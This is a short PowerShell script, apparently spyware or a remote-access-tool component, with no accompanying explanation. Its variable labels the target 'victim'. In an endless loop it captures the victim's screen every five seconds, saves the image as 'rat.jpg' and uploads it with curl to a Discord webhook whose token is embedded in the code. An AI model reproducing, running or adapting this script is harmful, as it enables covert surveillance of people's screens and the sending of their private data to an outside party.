$webhook = "https://discord.com/api/webhooks/1568824824401240066/zpG23RgKo5hO0hano5_SgAy-akduSOj62fLEigN_G6DBw2W7F0VemRfXL4RmhpjSemNz"
$name = "victim"

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

while ($true) {
  $b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
  $g = [System.Drawing.Graphics]::FromImage($b)
  $g.CopyFromScreen(0, 0, 0, 0, $b.Size)
  $path = "$env:TEMP\rat.jpg"
  $b.Save($path, [System.Drawing.Imaging.ImageFormat]::Jpeg)
  $g.Dispose(); $b.Dispose()

  curl.exe -s -F "file1=@$path" -F "payload_json={\"content\":\"[\" + $name + \"] screen @ \" + (Get-Date -Format 'HH:mm:ss') + '\"}" $webhook
  Start-Sleep -Seconds 5
}
